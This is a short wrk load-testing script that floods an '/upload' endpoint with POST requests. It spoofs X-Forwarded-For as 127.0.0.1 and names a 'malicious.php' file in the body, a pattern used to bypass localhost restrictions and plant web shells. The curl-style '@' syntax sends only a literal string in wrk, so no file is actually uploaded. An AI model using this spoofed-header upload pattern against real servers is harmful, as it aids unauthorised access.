wrk.method = "POST"
wrk.path = "/upload"
wrk.headers["X-Forwarded-For"] = "127.0.0.1"
wrk.body = "file=@malicious.php"
